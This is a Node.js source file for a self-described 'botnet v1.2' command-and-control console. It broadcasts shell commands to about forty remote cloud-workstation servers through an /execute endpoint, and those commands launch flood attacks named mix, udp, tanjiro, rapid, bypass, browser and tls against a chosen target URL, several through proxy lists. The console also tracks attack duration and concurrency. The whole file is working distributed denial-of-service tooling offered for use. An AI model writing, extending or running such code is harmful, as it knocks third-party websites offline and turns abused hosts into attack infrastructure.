const readline = require('readline');
const axios = require('axios');
const chalk = require('chalk');
const moment = require('moment');

// Server configuration
const SERVERS = [
    { name: 'API', url: 'https://8196-idx-api-1742400521295.cluster-nx3nmmkbnfe54q3dd4pfbgilpc.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1742400491127.cluster-nx3nmmkbnfe54q3dd4pfbgilpc.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1742400539469.cluster-qpa6grkipzc64wfjrbr3hsdma2.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-server-1742278306928.cluster-mwrgkbggpvbq6tvtviraw2knqg.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1742400534794.cluster-3g4scxt2njdd6uovkqyfcabgo6.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741549622757.cluster-qpa6grkipzc64wfjrbr3hsdma2.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741549828396.cluster-e3wv6awer5h7kvayyfoein2u4a.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741549858911.cluster-nx3nmmkbnfe54q3dd4pfbgilpc.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741549591315.cluster-fu5knmr55rd44vy7k7pxk74ams.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741549609757.cluster-a3grjzek65cxex762e4mwrzl46.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741550296963.cluster-e3wv6awer5h7kvayyfoein2u4a.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741550225260.cluster-e3wv6awer5h7kvayyfoein2u4a.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741550339619.cluster-nx3nmmkbnfe54q3dd4pfbgilpc.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741550284702.cluster-e3wv6awer5h7kvayyfoein2u4a.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741550265689.cluster-bec2e4635ng44w7ed22sa22hes.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741551222078.cluster-nx3nmmkbnfe54q3dd4pfbgilpc.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741551206422.cluster-nx3nmmkbnfe54q3dd4pfbgilpc.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741551141383.cluster-bec2e4635ng44w7ed22sa22hes.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741551193876.cluster-3g4scxt2njdd6uovkqyfcabgo6.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741551169592.cluster-nx3nmmkbnfe54q3dd4pfbgilpc.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741557226271.cluster-7ubberrabzh4qqy2g4z7wgxuw2.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741557240594.cluster-qpa6grkipzc64wfjrbr3hsdma2.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741557206881.cluster-a3grjzek65cxex762e4mwrzl46.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741557189563.cluster-e3wv6awer5h7kvayyfoein2u4a.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741557111544.cluster-mwrgkbggpvbq6tvtviraw2knqg.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741550635419.cluster-nx3nmmkbnfe54q3dd4pfbgilpc.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741550649848.cluster-3g4scxt2njdd6uovkqyfcabgo6.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741550611645.cluster-bec2e4635ng44w7ed22sa22hes.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741550624632.cluster-e3wv6awer5h7kvayyfoein2u4a.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-php-1741550585255.cluster-nx3nmmkbnfe54q3dd4pfbgilpc.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-walletgit-1741846743193.cluster-mwrgkbggpvbq6tvtviraw2knqg.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-walletgit-1741846651666.cluster-e3wv6awer5h7kvayyfoein2u4a.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-walletgit-1741846668638.cluster-e3wv6awer5h7kvayyfoein2u4a.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-walletgit-1741846639929.cluster-mwrgkbggpvbq6tvtviraw2knqg.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-walletgit-1741846727572.cluster-qpa6grkipzc64wfjrbr3hsdma2.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-apimanager-1742939890721.cluster-qpa6grkipzc64wfjrbr3hsdma2.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-apimanager-1742939886732.cluster-qpa6grkipzc64wfjrbr3hsdma2.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-apimanager-1742939881392.cluster-mwrgkbggpvbq6tvtviraw2knqg.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-apimanager-1742939825185.cluster-nx3nmmkbnfe54q3dd4pfbgilpc.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-apimanager-1742939768273.cluster-e3wv6awer5h7kvayyfoein2u4a.cloudworkstations.dev' },
    // ... (rest of the servers remain the same)
];

class BroadcastTerminal {
    constructor() {
        this.activeBroadcasts = []; // Track ongoing broadcasts
        this.lastBroadcastTime = null; // Track last broadcast time for cooldown
        this.lastConcurrentMaxReached = null; // Track when we hit max concurrent attacks
        this.MAX_DURATION = 600; // Maximum attack duration (seconds)
        this.COOLDOWN_DURATION = 3; // Cooldown period between attacks (seconds)
        this.MAX_CONCURRENT_ATTACKS = 3; // Maximum number of concurrent attacks
        this.CONCURRENT_COOLDOWN = 60; // Cooldown after reaching max concurrent (seconds)

        this.rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout,
            prompt: chalk.green('broadcast> ')
        });

        this.init();
    }

    init() {
        console.clear();
        console.log(chalk.bold.blue(`
        ┳┳┓  ┏┳┓    ••    
        ┃┃┃┏┓ ┃ ┏┓┏┓┓┓┏┓┏┓
        ┛ ┗┛  ┻ ┗┻┛┗┃┗┛ ┗┛
                    ┛     
                     botnet v1.2`));
        console.log(chalk.yellow('Type "help" for available commands'));
        console.log(chalk.yellow(`Max Attack Duration: ${this.MAX_DURATION} seconds`));
        console.log(chalk.yellow(`Cooldown Period: ${this.COOLDOWN_DURATION} seconds`));
        console.log(chalk.yellow(`Max Concurrent Attacks: ${this.MAX_CONCURRENT_ATTACKS}`));
        console.log(chalk.yellow(`Concurrent Cooldown: ${this.CONCURRENT_COOLDOWN} seconds`));

        this.rl.prompt();

        this.rl.on('line', async (line) => {
            const [command, ...args] = line.trim().toLowerCase().split(' ');

            try {
                switch(command) {
                    case 'help':
                        this.showHelp();
                        break;
                    case 'mix':
                        await this.executeMixCommand(args);
                        break;
                    case 'udp':
                        await this.executeUdpCommand(args);
                        break;
                    case 'tanjiro':
                        await this.executeTanjiroCommand(args);
                        break;
                    case 'rapid':
                        await this.executeRapidCommand(args);
                        break;
                    case 'bypass':
                        await this.executeBypassCommand(args);
                        break;
                    case 'browser':
                        await this.executeBrowserCommand(args);
                        break;
                    case 'tls':
                        await this.executeTlsCommand(args);
                        break;
                    case 'ongoing':
                        this.checkOngoingBroadcasts();
                        break;
                    case 'status':
                        await this.checkServerStatus();
                        break;
                    case 'config':
                        this.showConfig(args);
                        break;
                    case 'clear':
                        console.clear();
                        break;
                    case 'exit':
                        this.rl.close();
                        return;
                    default:
                        console.log(chalk.red(`Unknown command: ${command}`));
                        console.log(chalk.yellow('Type "help" for available commands'));
                }
            } catch (error) {
                console.log(chalk.red(`Error executing command: ${error.message}`));
            }

            this.rl.prompt();
        }).on('close', () => {
            console.log(chalk.red('\nExiting Broadcast Terminal...'));
            process.exit(0);
        });
    }

    showHelp() {
        console.log(chalk.bold.blue('\n=== Available Commands ==='));
        console.log(chalk.green('mix [url] [time]') + 
            ' - Execute mix broadcast command');
        console.log(chalk.green('udp [url] [time] [port]') + 
            ' - Execute UDP broadcast command [VIP]');
        console.log(chalk.green('tanjiro [url] [time]') + 
            ' - Execute Tanjiro broadcast command');
        console.log(chalk.green('rapid [url] [time]') + 
            ' - Execute Rapid broadcast command');
        console.log(chalk.green('bypass [url] [time]') + 
            ' - Execute Bypass broadcast command [VIP]');
        console.log(chalk.green('browser [url] [time]') + 
            ' - Execute Browser broadcast command [VIP]');
        console.log(chalk.green('tls [url] [time]') + 
            ' - Execute TLS broadcast command');
        console.log(chalk.green('ongoing') + 
            ' - Check ongoing broadcasts');
        console.log(chalk.green('status') + ' - Check status of all broadcast servers');
        console.log(chalk.green('config set [parameter] [value]') + ' - Change configuration settings');
        console.log(chalk.green('help') + ' - Show this help menu');
        console.log(chalk.green('clear') + ' - Clear the terminal screen');
        console.log(chalk.green('exit') + ' - Exit the broadcast terminal\n');
        console.log(chalk.yellow('Command Restrictions:'));
        console.log(chalk.white(`  - Max Attack Duration: ${this.MAX_DURATION} seconds`));
        console.log(chalk.white(`  - Cooldown Period: ${this.COOLDOWN_DURATION} seconds`));
        console.log(chalk.white(`  - Max Concurrent Attacks: ${this.MAX_CONCURRENT_ATTACKS}`));
        console.log(chalk.white(`  - Concurrent Cooldown: ${this.CONCURRENT_COOLDOWN} seconds`));
        console.log(chalk.yellow('Command Examples:'));
        console.log(chalk.white('  mix http://example.com 30'));
        console.log(chalk.white('  udp http://example.com 30 8080'));
        console.log(chalk.white('  tanjiro http://example.com 30'));
        console.log(chalk.white('  rapid http://example.com 30'));
        console.log(chalk.white('  bypass http://example.com 30'));
        console.log(chalk.white('  browser http://example.com 30'));
        console.log(chalk.white('  tls http://example.com 30'));
        console.log(chalk.white('  config set max_concurrent 5'));
    }

    showConfig(args) {
        if (args.length === 0) {
            console.log(chalk.bold.blue('\n=== Current Configuration ==='));
            console.log(chalk.white(`Max Attack Duration: ${this.MAX_DURATION} seconds`));
            console.log(chalk.white(`Cooldown Period: ${this.COOLDOWN_DURATION} seconds`));
            console.log(chalk.white(`Max Concurrent Attacks: ${this.MAX_CONCURRENT_ATTACKS}`));
            console.log(chalk.white(`Concurrent Cooldown: ${this.CONCURRENT_COOLDOWN} seconds`));
            return;
        }

        if (args[0] === 'set' && args.length === 3) {
            const [_, parameter, value] = args;
            const numValue = parseInt(value);

            if (isNaN(numValue)) {
                console.log(chalk.red('Value must be a number'));
                return;
            }

            switch(parameter) {
                case 'max_duration':
                    this.MAX_DURATION = numValue;
                    console.log(chalk.green(`Max Attack Duration set to ${numValue} seconds`));
                    break;
                case 'cooldown':
                    this.COOLDOWN_DURATION = numValue;
                    console.log(chalk.green(`Cooldown Period set to ${numValue} seconds`));
                    break;
                case 'max_concurrent':
                    this.MAX_CONCURRENT_ATTACKS = numValue;
                    console.log(chalk.green(`Max Concurrent Attacks set to ${numValue}`));
                    break;
                case 'concurrent_cooldown':
                    this.CONCURRENT_COOLDOWN = numValue;
                    console.log(chalk.green(`Concurrent Cooldown set to ${numValue} seconds`));
                    break;
                default:
                    console.log(chalk.red(`Unknown parameter: ${parameter}`));
                    console.log(chalk.yellow('Available parameters: max_duration, cooldown, max_concurrent, concurrent_cooldown'));
            }
        } else {
            console.log(chalk.red('Invalid configuration command.'));
            console.log(chalk.yellow('Usage: config set [parameter] [value]'));
            console.log(chalk.yellow('Available parameters: max_duration, cooldown, max_concurrent, concurrent_cooldown'));
        }
    }

    checkCooldownAndConcurrency() {
        const now = moment();

        // Update active broadcasts list
        this.activeBroadcasts = this.activeBroadcasts.filter(broadcast => 
            now.isBefore(broadcast.endTime)
        );

        // Check if we're at max concurrent attacks
        if (this.activeBroadcasts.length >= this.MAX_CONCURRENT_ATTACKS) {
            if (!this.lastConcurrentMaxReached) {
                this.lastConcurrentMaxReached = now;
            }
            console.log(chalk.red(`Maximum concurrent attacks (${this.MAX_CONCURRENT_ATTACKS}) reached.`));
            return false;
        }

        // Check concurrent cooldown if applicable
        if (this.lastConcurrentMaxReached) {
            const concurrentCooldownRemaining = this.CONCURRENT_COOLDOWN - now.diff(this.lastConcurrentMaxReached, 'seconds');
            if (concurrentCooldownRemaining > 0) {
                console.log(chalk.red(`Concurrent cooldown active. Please wait ${concurrentCooldownRemaining} seconds after max concurrent limit was reached.`));
                return false;
            }
            // Reset the concurrent cooldown timer after it expires
            this.lastConcurrentMaxReached = null;
        }

        // Check regular cooldown
        if (this.lastBroadcastTime) {
            const cooldownRemaining = this.COOLDOWN_DURATION - now.diff(this.lastBroadcastTime, 'seconds');
            if (cooldownRemaining > 0) {
                console.log(chalk.red(`Cooldown active. Please wait ${cooldownRemaining} seconds.`));
                return false;
            }
        }

        return true;
    }

    checkDuration(time) {
        // Check max duration
        if (parseInt(time) > this.MAX_DURATION) {
            console.log(chalk.red(`Attack duration cannot exceed ${this.MAX_DURATION} seconds.`));
            return false;
        }
        return true;
    }

    async broadcastCommandToServers(command) {
        // Use Promise.all to execute commands to all servers simultaneously
        const results = await Promise.all(SERVERS.map(async (server) => {
            try {
                const response = await axios.post(server.url + '/execute', { command }, {
                    timeout: 10000 // 10 seconds timeout
                });

                return {
                    server: server.url,
                    status: 'Success',
                    response: response.data
                };
            } catch (error) {
                return {
                    server: server.url,
                    status: 'Failed',
                    error: error.message
                };
            }
        }));

        return results;
    }

    displayBroadcastResults(results) {
        const successCount = results.filter(r => r.status === 'Success').length;
        const failureCount = results.filter(r => r.status === 'Failed').length;
    }

    async checkServerStatus() {
        console.log(chalk.bold.blue('\n=== Checking Server Status ==='));

        for (const server of SERVERS) {
            try {
                const startTime = Date.now();
                const response = await axios.get(server.url + '/status', { timeout: 5000 });
                const latency = Date.now() - startTime;

                console.log(chalk.green(`Server: ${server.url}`));
                console.log(chalk.white(`  Status   : Online`));
                console.log(chalk.white(`  Latency  : ${latency}ms`));
                console.log(chalk.white(`  Response : ${JSON.stringify(response.data)}\n`));
            } catch (error) {
                console.log(chalk.red(`Server: ${server.url}`));
                console.log(chalk.red(`  Status   : Offline`));
                console.log(chalk.red(`  Error    : ${error.message}\n`));
            }
        }
    }

    async executeMixCommand(args) {
        if (args.length !== 2) {
            console.log(chalk.red('Invalid arguments for mix command.'));
            console.log(chalk.yellow('Usage: mix [url] [time]'));
            return;
        }

        const [url, time] = args;

        // Check duration limit
        if (!this.checkDuration(time)) {
            return;
        }

        // Check cooldown and concurrency limits
        if (!this.checkCooldownAndConcurrency()) {
            return;
        }

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');

        // Construct the full broadcast command
        const fullCommand = `cd method && node mix.js ${url} ${time} 1 1`;

        console.log(chalk.bold.blue('\n=== Reaction Details ==='));
        console.log(chalk.green(`Target URL     : ${url}`));
        console.log(chalk.green(`Time           : ${time} seconds`));
        console.log(chalk.green(`Method         : MIX`));
        console.log(chalk.green(`Sent On        : ${currentDateTime.format('HH:mm:ss - DD - MMMM - YYYY')}`));
        console.log(chalk.green(`Concurrent     : ${this.activeBroadcasts.length + 1}/${this.MAX_CONCURRENT_ATTACKS}`));

        console.log(chalk.blue(`\nAttack has launched. Please wait for the results.`));

        // Update last broadcast time
        this.lastBroadcastTime = currentDateTime;

        // Track the broadcast
        const broadcastEntry = {
            type: 'MIX',
            url: url,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        };
        this.activeBroadcasts.push(broadcastEntry);

        try {
            // Broadcast the command to all servers
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);

            // Display broadcast results
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.red('Mix command broadcast failed:', error.message));
        }
    }

    async executeUdpCommand(args) {
        if (args.length !== 3) {
            console.log(chalk.red('Invalid arguments for UDP command.'));
            console.log(chalk.yellow('Usage: udp [url] [time] [port]'));
            return;
        }

        const [url, time, port] = args;

        // Check duration limit
        if (!this.checkDuration(time)) {
            return;
        }

        // Check cooldown and concurrency limits
        if (!this.checkCooldownAndConcurrency()) {
            return;
        }

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');

        // Construct the full UDP broadcast command
        const fullCommand = `cd method && node udp.js ${url} 20 ${time} ${port}`;

        console.log(chalk.bold.blue('\n=== Reaction Details ==='));
        console.log(chalk.green(`Target URL     : ${url}`));
        console.log(chalk.green(`Time           : ${time} seconds`));
        console.log(chalk.green(`Port           : ${port}`));
        console.log(chalk.green(`Method         : UDP`));
        console.log(chalk.green(`Sent On        : ${currentDateTime.format('HH:mm:ss - DD - MMMM - YYYY')}`));
        console.log(chalk.green(`Concurrent     : ${this.activeBroadcasts.length + 1}/${this.MAX_CONCURRENT_ATTACKS}`));

        console.log(chalk.blue(`\nAttack has launched. Please wait for the results.`));

        // Update last broadcast time
        this.lastBroadcastTime = currentDateTime;

        // Track the broadcast
        const broadcastEntry = {
            type: 'UDP',
            url: url,
            port: port,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        };
        this.activeBroadcasts.push(broadcastEntry);

        try {
            // Broadcast the command to all servers
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);

            // Display broadcast results
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.red('UDP command broadcast failed:', error.message));
        }
    }

    async executeTanjiroCommand(args) {
        if (args.length !== 2) {
            console.log(chalk.red('Invalid arguments for Tanjiro command.'));
            console.log(chalk.yellow('Usage: tanjiro [url] [time]'));
            return;
        }

        const [url, time] = args;

        // Check duration limit
        if (!this.checkDuration(time)) {
            return;
        }

        // Check cooldown and concurrency limits
        if (!this.checkCooldownAndConcurrency()) {
            return;
        }

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');

        // Construct the full Tanjiro broadcast command
        const fullCommand = `cd method && node tornado GET ${url} ${time} 1 128 proxy.txt`;

        console.log(chalk.bold.blue('\n=== Reaction Details ==='));
        console.log(chalk.green(`Target URL     : ${url}`));
        console.log(chalk.green(`Time           : ${time} seconds`));
        console.log(chalk.green(`Method         : Tanjiro`));
        console.log(chalk.green(`Sent On        : ${currentDateTime.format('HH:mm:ss - DD - MMMM - YYYY')}`));
        console.log(chalk.green(`Concurrent     : ${this.activeBroadcasts.length + 1}/${this.MAX_CONCURRENT_ATTACKS}`));

        console.log(chalk.blue(`\nAttack has launched. Please wait for the results.`));

        // Update last broadcast time
        this.lastBroadcastTime = currentDateTime;

        // Track the broadcast
        const broadcastEntry = {
            type: 'Tanjiro',
            url: url,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        };
        this.activeBroadcasts.push(broadcastEntry);

        try {
            // Broadcast the command to all servers
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);

            // Display broadcast results
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.red('Tanjiro command broadcast failed:', error.message));
        }
    }

    async executeRapidCommand(args) {
        if (args.length !== 2) {
            console.log(chalk.red('Invalid arguments for Rapid command.'));
            console.log(chalk.yellow('Usage: rapid [url] [time]'));
            return;
        }

        const [url, time] = args;

        // Check duration limit
        if (!this.checkDuration(time)) {
            return;
        }

        // Check cooldown and concurrency limits
        if (!this.checkCooldownAndConcurrency()) {
            return;
        }

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');

        // Construct the full Rapid broadcast command
        const fullCommand = `cd method && node RAPID.js ${url} ${time} 64 8 proxy.txt`;

        console.log(chalk.bold.blue('\n=== Reaction Details ==='));
        console.log(chalk.green(`Target URL     : ${url}`));
        console.log(chalk.green(`Time           : ${time} seconds`));
        console.log(chalk.green(`Method         : RAPID`));
        console.log(chalk.green(`Sent On        : ${currentDateTime.format('HH:mm:ss - DD - MMMM - YYYY')}`));
        console.log(chalk.green(`Concurrent     : ${this.activeBroadcasts.length + 1}/${this.MAX_CONCURRENT_ATTACKS}`));

        console.log(chalk.blue(`\nAttack has launched. Please wait for the results.`));

        // Update last broadcast time
        this.lastBroadcastTime = currentDateTime;

        // Track the broadcast
        const broadcastEntry = {
            type: 'RAPID',
            url: url,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        };
        this.activeBroadcasts.push(broadcastEntry);

        try {
            // Broadcast the command to all servers
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);

            // Display broadcast results
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.red('Rapid command broadcast failed:', error.message));
        }
    }

    async executeBypassCommand(args) {
        if (args.length !== 2) {
            console.log(chalk.red('Invalid arguments for Bypass command.'));
            console.log(chalk.yellow('Usage: bypass [url] [time]'));
            return;
        }

        const [url, time] = args;

        // Check duration limit
        if (!this.checkDuration(time)) {
            return;
        }

        // Check cooldown and concurrency limits
        if (!this.checkCooldownAndConcurrency()) {
            return;
        }

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');

        // Construct the full Bypass broadcast command
        const fullCommand = `cd method && node Cibi.js ${url} ${time} 8 64 proxy.txt`;

        console.log(chalk.bold.blue('\n=== Reaction Details ==='));
        console.log(chalk.green(`Target URL     : ${url}`));
        console.log(chalk.green(`Time           : ${time} seconds`));
        console.log(chalk.green(`Method         : BYPASS`));
        console.log(chalk.green(`Sent On        : ${currentDateTime.format('HH:mm:ss - DD - MMMM - YYYY')}`));
        console.log(chalk.green(`Concurrent     : ${this.activeBroadcasts.length + 1}/${this.MAX_CONCURRENT_ATTACKS}`));

        console.log(chalk.blue(`\nAttack has launched. Please wait for the results.`));

        // Update last broadcast time
        this.lastBroadcastTime = currentDateTime;

        // Track the broadcast
        const broadcastEntry = {
            type: 'BYPASS',
            url: url,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        };
        this.activeBroadcasts.push(broadcastEntry);

        try {
            // Broadcast the command to all servers
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);

            // Display broadcast results
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.red('Bypass command broadcast failed:', error.message));
        }
    }

    async executeBrowserCommand(args) {
        if (args.length !== 2) {
            console.log(chalk.red('Invalid arguments for Browser command.'));
            console.log(chalk.yellow('Usage: browser [url] [time]'));
            return;
        }

        const [url, time] = args;

        // Check duration limit
        if (!this.checkDuration(time)) {
            return;
        }

        // Check cooldown and concurrency limits
        if (!this.checkCooldownAndConcurrency()) {
            return;
        }

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');

        // Construct the full Browser broadcast command
        const fullCommand = `cd method && node MixBill.js ${url} ${time} 9 39`;

        console.log(chalk.bold.blue('\n=== Reaction Details ==='));
        console.log(chalk.green(`Target URL     : ${url}`));
        console.log(chalk.green(`Time           : ${time} seconds`));
        console.log(chalk.green(`Method         : BROWSER`));
        console.log(chalk.green(`Sent On        : ${currentDateTime.format('HH:mm:ss - DD - MMMM - YYYY')}`));
        console.log(chalk.green(`Concurrent     : ${this.activeBroadcasts.length + 1}/${this.MAX_CONCURRENT_ATTACKS}`));

        console.log(chalk.blue(`\nAttack has launched. Please wait for the results.`));

        // Update last broadcast time
        this.lastBroadcastTime = currentDateTime;

        // Track the broadcast
        const broadcastEntry = {
            type: 'BROWSER',
            url: url,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        };
        this.activeBroadcasts.push(broadcastEntry);

        try {
            // Broadcast the command to all servers
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);

            // Display broadcast results
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.red('Browser command broadcast failed:', error.message));
        }
    }

    async executeTlsCommand(args) {
        if (args.length !== 2) {
            console.log(chalk.red('Invalid arguments for TLS command.'));
            console.log(chalk.yellow('Usage: tls [url] [time]'));
            return;
        }

        const [url, time] = args;

        // Check duration limit
        if (!this.checkDuration(time)) {
            return;
        }

        // Check cooldown and concurrency limits
        if (!this.checkCooldownAndConcurrency()) {
            return;
        }

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');

        // Construct the full TLS broadcast command
        const fullCommand = `cd method && node TLS.js ${url} ${time} 8 1`;

        console.log(chalk.bold.blue('\n=== Reaction Details ==='));
        console.log(chalk.green(`Target URL     : ${url}`));
        console.log(chalk.green(`Time           : ${time} seconds`));
        console.log(chalk.green(`Method         : TLS`));
        console.log(chalk.green(`Sent On        : ${currentDateTime.format('HH:mm:ss - DD - MMMM - YYYY')}`));
        console.log(chalk.green(`Concurrent     : ${this.activeBroadcasts.length + 1}/${this.MAX_CONCURRENT_ATTACKS}`));

        console.log(chalk.blue(`\nAttack has launched. Please wait for the results.`));

        // Update last broadcast time
        this.lastBroadcastTime = currentDateTime;

        // Track the broadcast
        const broadcastEntry = {
            type: 'TLS',
            url: url,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        };
        this.activeBroadcasts.push(broadcastEntry);

        try {
            // Broadcast the command to all servers
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);

            // Display broadcast results
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.red('TLS command broadcast failed:', error.message));
        }
    }

    checkOngoingBroadcasts() {
        const now = moment();

        // Remove completed broadcasts
        this.activeBroadcasts = this.activeBroadcasts.filter(broadcast => 
            now.isBefore(broadcast.endTime)
        );

        if (this.activeBroadcasts.length === 0) {
            console.log(chalk.yellow('\nNo ongoing broadcasts.'));
        } else {
            console.log(chalk.bold.blue('\n=== Ongoing Attackers ==='));
            console.log(chalk.yellow(`Active Attacks: ${this.activeBroadcasts.length}/${this.MAX_CONCURRENT_ATTACKS}`));

            this.activeBroadcasts.forEach((broadcast, index) => {
                const remainingTime = moment.duration(broadcast.endTime.diff(now));

                console.log(chalk.green(`Broadcast ${index + 1}:`));
                console.log(chalk.white(`  Type     : ${broadcast.type}`));
                console.log(chalk.white(`  Target   : ${broadcast.url}`));
                if (broadcast.port) {
                    console.log(chalk.white(`  Port     : ${broadcast.port}`));
                }
                console.log(chalk.white(`  Started  : ${broadcast.startTime.format('HH:mm:ss - DD - MMMM - YYYY')}`));
                console.log(chalk.white(`  Duration : ${broadcast.duration} seconds`));
                console.log(chalk.yellow(`  Remaining: ${remainingTime.minutes()} min ${remainingTime.seconds()} sec`));
            });
        }

        // Check regular cooldown if applicable
        if (this.lastBroadcastTime) {
            const cooldownRemaining = this.COOLDOWN_DURATION - now.diff(this.lastBroadcastTime, 'seconds');
            if (cooldownRemaining > 0) {
                console.log(chalk.yellow(`\nCooldown active. Remaining: ${cooldownRemaining} seconds`));
            }
        }

        // Check concurrent cooldown if applicable
        if (this.lastConcurrentMaxReached) {
            const concurrentCooldownRemaining = this.CONCURRENT_COOLDOWN - now.diff(this.lastConcurrentMaxReached, 'seconds');
            if (concurrentCooldownRemaining > 0) {
                console.log(chalk.yellow(`\nConcurrent cooldown active. Remaining: ${concurrentCooldownRemaining} seconds`));
            }
        }
    }
}

// Initialize the terminal
new BroadcastTerminal();
